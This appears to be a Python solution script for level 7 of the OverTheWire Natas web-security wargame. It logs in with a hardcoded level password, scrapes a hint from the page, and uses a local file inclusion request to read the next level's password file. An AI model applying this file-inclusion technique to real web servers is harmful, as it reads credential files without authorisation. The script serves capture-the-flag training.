import requests
import re

def flag(username,password,lfi):
    flag_site = requests.get(lfi,auth=(username,password))
    search = re.compile(r"<br>(.*?)<!-- hint:", re.DOTALL)
    output_text = search.search(flag_site.text).group(1)
    print("The flag for natas7 is: " + output_text.replace("<br>","").strip())

def login(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    parameter = re.findall('<a href="(.*)about">',site.text)
    etc = re.findall("webuser natas8 is in (.*)-->",site.text)
    lfi = url + parameter[0] + etc[0].strip()
    flag(username,password,lfi)

if __name__=="__main__":
    url = "http://natas7.natas.labs.overthewire.org/"
    username = "natas7"
    password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"
    login(url,username,password)